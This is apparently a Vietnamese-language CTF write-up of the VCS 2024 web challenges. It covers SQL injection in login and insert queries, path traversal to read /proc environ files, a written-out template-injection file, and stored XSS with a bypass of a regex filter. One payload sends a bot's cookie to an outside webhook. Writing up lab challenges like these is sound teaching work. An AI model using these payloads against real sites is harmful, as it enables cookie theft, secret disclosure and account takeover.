---
layout: post
title:  "VCS 2024"
date:   2025-06-25 16:37:00 +0700
tag: Writeup, VCS2024
categories: jekyll update
---

# WEB_01_02_03 

Đến với challenge này, mình được cung cấp 1 file source code. 

Với giao diện web, ban đầu như sau: 
![image](https://hackmd.io/_uploads/B115yIG4xl.png)

Sau khi đọc qua source code, thì nhận thấy web bị `SQLi` và tóm tắt như sau: 

### SQLi-able field 
`get_meme("/meme")`
```sql=
SELECT filename FROM memes WHERE id="{id}"
```
Giá trị id do người dùng truyền vào bị convert --> UUID trước khi đặt vào câu lệnh SQL --> không khai thác được SQLi

`login ("/login")`
```sql=
SELECT * FROM users WHERE username=("{username}")
```
len(username) < 25 

`Thêm meme vào DB ("/upload-meme")`
```sql=
INSERT INTO memes (id, title, filename) VALUES ("{id}", "{title}", "{filename}")
```
- Không được path traversal (.. hoặc / ) tại trường filename 
- Trường id thì sinh ngẫu nhiên 
- Trường title không kiểm soát --> Có thể inject được 

## FLAG-Location 
- Flag 1: `/freeflag`
- Flag 2: login as admin
- Flag 3: `/proc/self/environ` hoặc `/proc/x/environ`

### Flag 1 

```python=
@app.route("/freeflag")
def index():
    segcret = request.args.get("segcret", None)

    if segcret is None:
        return "Please provide a secret key!"

    session["flag"] = FLAG1
    if segcret == app.config["SECRET_KEY"]:
        return session["flag"]
    else:
        return "Incorrect secret key!"
```
Có dòng `session["flag"] = FLAG1` nghĩa là trong session có FLAG 1 
Còn nếu mình cung cấp dúng `segcret` đúng với `SECRET_KEY` thì nó sẽ in ra màn hình FLAG1, nhưng `SECRET_KEY` được sinh ngẫu nhiên. 

![image](https://hackmd.io/_uploads/BkvaX8fVxe.png)

![image](https://hackmd.io/_uploads/rJ6am8z4eg.png)

### Flag 2 

Mục tiêu của FLAG2 là đăng nhập bằng `amdin`. 

```python=
@app.route("/login")
def login():
    username = request.args.get("username", None)
    password = request.args.get("password", None)
    if username is None or password is None:
        return "Please provide username and password!"

    # if len(username) > 25:
    #     return "Username too long!", 403
    
    user = db.get_user(username)
    if user is None:
        return "User not found", 403

    hashed_password = hashlib.md5(password.encode()).hexdigest()
    if user[1] == hashed_password:
        session["username"] = user[0]
        return "Login successful!"
    else:
        return "Incorrect password!", 403


@app.route("/admin")
def admin():
    if session.get("username") != "admin":
        return "You are not admin!", 403

    return f"Welcome admin! Here is your flag: {FLAG2}"
```
Ở endpoint `login` sẽ lấy username dựa vào `get_user` trong db. Sau đó, password sẽ được hash rồi so sánh với hash trong db nếu đúng thì được login vào. 

Do challenge đã bỏ qua điều kiện `len(username) < 25`, nên sẽ khai thác theo cách cập nhật lại hash password của tài khoản admin. 

![image](https://hackmd.io/_uploads/Byp288zNel.png)

Thì như vậy, nếu mình bỏ trống `admin` ở câu query đầu. Thì nó sẽ hiểu câu query sau.

![image](https://hackmd.io/_uploads/SJQbw8G4ex.png)

Nhưng nếu trong db có nhiều hash thì mình cần sắp xếp lại để cho hash của mình lên trên đầu.

![image](https://hackmd.io/_uploads/HkqdvIfVeg.png)

![image](https://hackmd.io/_uploads/S1ERwIz4xx.png)

Từ đây, mình có thể lấy session này để login vào `/admin` vì đây là session của admin. 

![image](https://hackmd.io/_uploads/rylYOUfVee.png)

### Flag 3 
Mục tiêu là đọc `/proc/self/environ` hoặc `/proc/x/environ` qua endpoint `/upload-meme`. Khi upload 1 file thành công thì được nối vào `./meme/{filename}`

Vì trường `title` không có kiểm soát nên mình có thể inject để nối payload path traversal vào trường `filename`. Như vậy, cần inject để thực hiện vào path traversal để có thể đọc file.

Câu query ban đầu:
```sql= 
INSERT INTO memes (id, title, filename) VALUES ("{id}", "{title}", "{filename}")
```
Câu query lúc sau: 
```sql=
INSERT INTO memes (id, title, filename) VALUES ("z", "x", "../../../../../proc/self/environ")--+a, "")
```
Mình cần upload nhưng mà ko UI nên phải gửi qua `curl`.

![image](https://hackmd.io/_uploads/HJA5xvfNxe.png)

Sau đó, mình truy cập vào id do ảnh mình đã upload thành công. 

![image](https://hackmd.io/_uploads/HyGSWvG4eg.png)

Nhưng vì sao chỉ có FLAG3, vì trong docker có file như sau: 
```bash=
#!/bin/sh

echo "$FLAG1" > /flag1.txt
unset FLAG1

echo "$FLAG2" > /flag2.txt
unset FLAG2

echo "$FLAG3"

python3 /app/app.py
```

Vì tác giả đã unset FLAG1 và FLAG2,
nhưng khi docker chạy thì nó sẽ đọc biến môi trường nghĩa là còn đâu đó vẫn có thể tiến trình vẫn còn giữ cả FLAG1 và FLAG2.

Vậy nếu mình đọc tiến trình đầu tiên của docker thì sao? Chỉnh lại payload để đọc `/proc/1/environ`

![image](https://hackmd.io/_uploads/rJq7GwMEgl.png)

Từ đây, thì mình có cả 3 FLAG lun.

# WEB_04 

Đến với challenge này, ta được cung cấp 1 file source code. 
Với giao diện, web ban đầu như sau:

![image](https://hackmd.io/_uploads/rJvUmoGVgx.png)

## Path_Traversal-able field 

`/feedback`
- username không bị chặn gì 
- subject, len < 128, không được có `_` và `/`
- content, len < 512, không được có `_`, `.` và không có từ trong blacklist `bad_cmd` và `bad_chars`

![image](https://hackmd.io/_uploads/rk4RVsfEel.png)

Với hàm open cho phép ghi 1 file, nhưng quan trọng là nó có thể dẫn tới 1 file theo đường dẫn tuyệt đối hay đường dẫn tương đối. 

Mà viết 1 file dựa trên `subject`, nên mình có thể kiểm soát.

**Nhưng cần ghi vào đâu?**
Mình cần kiểm tra trong docker. 

![image](https://hackmd.io/_uploads/r1o_wozVge.png)

Thì ở đây, mình có hai folder là `feedback` và `errors` có quyền write, và sticky bit.

![image](https://hackmd.io/_uploads/SkAr_jfExg.png)

Và khi bị filter, thì nó in ra ERROR: {{ error }} và include tamplete trong folder `errors/` có sẵn tên error còn nếu ko có thì ignore missing. Vậy có thể là mình sẽ viết vào folder này để nó có thể render ra được payload.

![image](https://hackmd.io/_uploads/B1V1KiMEgl.png)

**Thì mình có thể đặt ra là có bị SSTI hay ko ?**

![image](https://hackmd.io/_uploads/H16zFoz4ex.png)

Thì nó đã bị escape khi mà nhập payload `{{ 7*7 }}` thì lúc đó nó sẽ thành `{{ {{ 7*7 }} }}`. 

Nhưng nếu viết 1 file, có sẵn payload `{{ 8*8 }}` thì nó có thể in ra ko. 

![image](https://hackmd.io/_uploads/HyvfqsfVlg.png)

![image](https://hackmd.io/_uploads/H1-NqofVee.png)
Nó có thể in ra, như vậy nó có thể bị SSTI. 

## Ý Tưởng Khai Thác 

Mình lợi dụng path traversal để viết file .html vào folder `errors` mà trong đó chứa payload để in ra config. 

Vì FLAG được lưu trong config.

![image](https://hackmd.io/_uploads/rJDliozExe.png)

### Khai Thác
![image](https://hackmd.io/_uploads/SyIoojzVeg.png)

Sau khi viết được thì mình được 1 tên file random.
![image](https://hackmd.io/_uploads/rk_Lssz4lg.png)

Sau đó, mình truy cập qua tham số `error` để có thể render.
![image](https://hackmd.io/_uploads/S1H6iiGExx.png)

# WEB_06

Challenge này được cung cấp 1 file source code. 
Và có giao diện web như sau: 

![image](https://hackmd.io/_uploads/SJVYHr_4lg.png)

## XSS-able Field 

- `/` --> function `home` --> `get_user` trong DB --> được viết bằng prepare statement nên không thể inject SQLi.
- `/login` --> lấy `username` và `password` cũng được viết bằng prepare statement nên không thể inject SQLi. 
- `/register` --> nhập `username`, `password` và `confirm password` cũng được dùng prepare statement nhưng lại không chặn xss tại `username`, `password` hay `confirm password`
- `/profile/update` --> nhập `email`, `bio` có chặn xss bằng hàm `filter_xss`.
- `/profile/<uid>` --> `uid` là được sinh ngẫu nhiên bằng `uuid4()`
- `/report_profile/<reported_user_id>` --> gọi đến dịch vụ internal --> là một con bot có chứa FLAG trong cookie và ko có cơ chế bảo vệ HttpOnly nên fetch document.cookie là được.

## Mục Tiêu

Là đánh cắp cookie của bot khi mà khi report 1 profile tại `/report_profile/<reported_user_id>`

## Khai thác

Như vậy nếu mình inject xss vào trong trường username tại `/register` thì sao??

![image](https://hackmd.io/_uploads/HkfB9Hd4eg.png)

Sau đó login lại bằng tài khoản đó là username `<script>alert(origin)</script>`
![image](https://hackmd.io/_uploads/H1Pw5rO4lg.png)

Như vậy, khi đó hoàn toàn mình viết đoạn payload để lấy cookie. 

Với payload là, `<img src=x onerror=fetch("<url_webhook>?c="+document.cookie)>`

![image](https://hackmd.io/_uploads/rk9YayYVex.png)

Sau khi đăng nhập thì mình sinh được 1 id của user, dùng id đó để gọi tới endpoint `report_profile/<reported_user_id>`

![image](https://hackmd.io/_uploads/SyDflgFEgx.png)

Ngoài ra, trường bio khi dùng regex để có thể filter chặn các tag nhưng không hoàn toàn. 

![image](https://hackmd.io/_uploads/BJXjmgFNgg.png)

Nhưng nếu thẻ mà không đóng tag thì nó hoàn toàn không match nên có thể bypass.

![image](https://hackmd.io/_uploads/HknTmgKVgx.png)

Vậy mình inject vào trường Bio với payload là `<img src=x onerror="alert(origin)"`

![image](https://hackmd.io/_uploads/HJagExKVle.png)

Và khi mình truy cập vào trong dạng xem các profile. 

![image](https://hackmd.io/_uploads/H1Q7NeK4gg.png)

Hoàn toàn bị XSS. 

Do vậy mình hoàn toàn có thể tiêm với payload tương tự vào trường Bio.

![image](https://hackmd.io/_uploads/B10DdgK4gx.png)

![image](https://hackmd.io/_uploads/Hy9ddgK4ll.png)
